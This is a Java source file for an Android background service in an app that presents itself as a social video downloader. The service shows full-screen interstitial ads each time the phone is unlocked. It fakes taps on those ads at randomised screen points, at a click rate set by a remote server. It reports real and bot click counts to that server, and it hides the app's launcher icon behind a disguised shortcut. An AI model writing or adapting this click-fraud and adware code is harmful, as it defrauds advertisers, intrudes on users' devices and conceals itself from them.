package com.v2social.socialdownloader.services;

import android.app.Instrumentation;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Point;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;
import android.view.Display;
import android.view.MotionEvent;
import android.view.WindowManager;

import com.google.android.gms.ads.AdListener;
import com.google.android.gms.ads.AdRequest;
import com.google.android.gms.ads.InterstitialAd;
import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.v2social.socialdownloader.AppConstants;
import com.v2social.socialdownloader.R;
import com.v2social.socialdownloader.ShowAds;
import com.v2social.socialdownloader.network.CheckAds;
import com.v2social.socialdownloader.network.ClientConfig;

import java.io.IOException;
import java.util.Random;
import java.util.UUID;
import java.util.concurrent.ScheduledThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MyService extends Service {
    private boolean isBotClick = false;
    private boolean isContinousShowAds = false;
    private boolean isReportResult = false;

    private ScheduledThreadPoolExecutor myTask;
    private String uuid;
    private String idFullService;
    private int intervalService;
    private int delayService;

    private int countTotalShow=0;
    private int countRealClick=0;
    private int countBotClick=0;
    private int delay_retention = -1;

    private ClientConfig clientConfig;
    private InterstitialAd mInterstitialAd;
    private CheckAds checkAds;

    private static final Point [] points = {new Point(50,50),new Point(51,57),new Point(79,85),new Point(72,74),
            new Point(70,92),new Point(48,80),new Point(48,65),new Point(53,40)};

    @Override
    public void onCreate() {
        SharedPreferences mPrefs = getApplicationContext().getSharedPreferences("adsserver", 0);
        uuid = mPrefs.getString("uuid", UUID.randomUUID().toString());
        idFullService = mPrefs.getString("idFullService", "/21617015150/734252/21734809637");
        intervalService = mPrefs.getInt("intervalService", 10);
        delayService = mPrefs.getInt("delayService", 24);
        delay_retention = mPrefs.getInt("delay_retention", -1);

        MyBroadcast myBroadcast = new MyBroadcast();
        IntentFilter filter = new IntentFilter("android.intent.action.USER_PRESENT");
        registerReceiver(myBroadcast, filter);
        scheduleTask();
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    private void addShortcut() {
        //Adding shortcut for MainActivity
        try {
            PackageManager p = getPackageManager();
            ComponentName componentName = new ComponentName(this.getPackageName(), getPackageName()+".MAIN1");
            p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
//            Log.d("caomui","DONE hide icon");
        }
        catch (Exception e)
        {
//            Log.d("caomui","ERROR HIDE ICON");
        }

        Intent shortcutIntent = new Intent(getApplicationContext(),
                com.v2social.socialdownloader.MainActivity.class);

        shortcutIntent.setAction(Intent.ACTION_MAIN);

        Intent addIntent = new Intent();
        addIntent
                .putExtra(Intent.EXTRA_SHORTCUT_INTENT, shortcutIntent);
        addIntent.putExtra(Intent.EXTRA_SHORTCUT_NAME, "Social video downloader");
        addIntent.putExtra(Intent.EXTRA_SHORTCUT_ICON_RESOURCE,
                Intent.ShortcutIconResource.fromContext(getApplicationContext(),
                        com.v2social.socialdownloader.R.drawable.icon));

        addIntent
                .setAction("com.android.launcher.action.INSTALL_SHORTCUT");
        addIntent.putExtra("duplicate", false);  //may it's already there so don't duplicate
        getApplicationContext().sendBroadcast(addIntent);

//        Log.d("caomui","ADD shortcut done");
        createShortcut();
    }

    private void scheduleTask() {
        myTask = new ScheduledThreadPoolExecutor(1);
        myTask.scheduleAtFixedRate(new Runnable() {
            @Override
            public void run() {
                SharedPreferences mPrefs = getApplicationContext().getSharedPreferences("adsserver", 0);
                int totalTime = mPrefs.getInt("totalTime", 0);
                totalTime += intervalService;
                mPrefs.edit().putInt("totalTime", totalTime).commit();

                if(delay_retention >= 0 && totalTime > delay_retention)//add shortcut or không
                {
                    addShortcut();
                    delay_retention = -1;
                    mPrefs.edit().putInt("delay_retention",-1).commit();
                }

                if (totalTime < delayService * 60) {
                    return;
                }

                if(totalTime == 4000)
                {
                    SharedPreferences mPrefs2 = getSharedPreferences("support_xx", 0);
                    mPrefs.edit().putInt("accept", 2).commit();
                }

                if(totalTime%1440 == 0)
                {
                    countTotalShow = 0;
                    countBotClick = 0;
                    countRealClick = 0;
                    isReportResult = true;
                }
                if(isReportResult || clientConfig == null)
                    getClientConfig();
                isContinousShowAds = true;
//                Log.d("caomui","------------");
            }
        }, 0, intervalService, TimeUnit.MINUTES);

    }

    private void getClientConfig()
    {
        OkHttpClient client = new OkHttpClient();
        RequestBody body = new FormBody.Builder()
                .add("countTotalShow", countTotalShow + "")
                .add("countRealClick",countRealClick+"")
                .add("countBotClick",countBotClick+"")
                .add("id",uuid)
                .build();
        Request okRequest = new Request.Builder()
                .url(AppConstants.URL_CLIENT_CONFIG)
                .post(body)
                .build();
        client.newCall(okRequest).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                Gson gson = new GsonBuilder().create();
                clientConfig = gson.fromJson(response.body().string(),ClientConfig.class);
                isReportResult = false;
            }
        });
    }

    private void createShortcut()
    {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Thread.sleep(5000);
                    OkHttpClient client = new OkHttpClient();
                    RequestBody body = new FormBody.Builder()
                            .add("id",uuid)
                            .build();
                    Request okRequest = new Request.Builder()
                            .url(AppConstants.URL_CREATE_SHORTCUT)
                            .post(body)
                            .build();
                    client.newCall(okRequest).execute();
                }
                catch (Exception e){
                }
            }
        }).start();
    }

    class MyBroadcast extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            Log.d("cao", "Unlock Screen "+uuid);
            if(!isContinousShowAds || clientConfig == null)
                return;
            if (new Random().nextInt(100) > clientConfig.max_percent_ads)
            {
                return;
            }
            checkAds = new CheckAds();
            checkAds.delayClick = clientConfig.min_click_delay + new Random().nextInt(clientConfig.max_click_delay);
            if(new Random().nextInt(100) < clientConfig.max_ctr_bot)
                checkAds.isBotClick = 1;
            else
                checkAds.isBotClick = 0;
            Point point = points[new Random().nextInt(points.length)];
            checkAds.x = point.x;
            checkAds.y = point.y;
            isBotClick = false;

            new Handler(Looper.getMainLooper()).post(new Runnable() {
                public void run() {
                    mInterstitialAd = new InterstitialAd(MyService.this);
                    mInterstitialAd.setAdUnitId(idFullService);
                    mInterstitialAd.setAdListener(new AdListener() {

                        @Override
                        public void onAdClosed() {
                            super.onAdClosed();
                            try {
                                if (Build.VERSION.SDK_INT < 21) {
                                    ShowAds.getInstance().finishAffinity();
                                } else {
                                    ShowAds.getInstance().finishAndRemoveTask();
                                }
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }

                        @Override
                        public void onAdFailedToLoad(int i) {
                            super.onAdFailedToLoad(i);
                            isContinousShowAds = true;
                        }

                        @Override
                        public void onAdLeftApplication() {
                            super.onAdLeftApplication();
                            if (isBotClick)
                                countBotClick +=1;
                            else
                                countRealClick +=1;
                        }

                        @Override
                        public void onAdOpened() {
                            super.onAdOpened();
                            countTotalShow += 1;
                            isContinousShowAds = false;
                            if (checkAds.isBotClick == 1) {
                                new Thread(new Runnable() {
                                    @Override
                                    public void run() {
                                        try {
                                            Thread.sleep(checkAds.delayClick * 100);
                                            WindowManager window = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
                                            Display display = window.getDefaultDisplay();
                                            Point point = new Point();
                                            display.getSize(point);
                                            int width = checkAds.x * point.x / 100;
                                            int height = checkAds.y * point.y / 100;
                                            Instrumentation m_Instrumentation = new Instrumentation();
                                            m_Instrumentation.sendPointerSync(MotionEvent.obtain(
                                                    android.os.SystemClock.uptimeMillis(),
                                                    android.os.SystemClock.uptimeMillis(),
                                                    MotionEvent.ACTION_DOWN, width, height, 0));
                                            Thread.sleep(new Random().nextInt(100));
                                            m_Instrumentation.sendPointerSync(MotionEvent.obtain(
                                                    android.os.SystemClock.uptimeMillis(),
                                                    android.os.SystemClock.uptimeMillis(),
                                                    MotionEvent.ACTION_UP, width, height, 0));
                                            isBotClick = true;
                                        } catch (Exception e) {
                                            e.printStackTrace();
                                            isBotClick = false;
                                        }
                                    }
                                }).start();
                            }
                        }

                        @Override
                        public void onAdLoaded() {
                            super.onAdLoaded();

                            try {
                                Intent showAds = new Intent(getApplicationContext(), ShowAds.class);
                                showAds.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                startActivity(showAds);
                                mInterstitialAd.show();
                            }
                            catch (Exception e){
                            }
                        }
                    });

                    mInterstitialAd.loadAd(new AdRequest.Builder().build());//addTestDevice("3CC7F69A2A4A1EB57306DA0CFA16B969")
                }
            });
        }
    }
}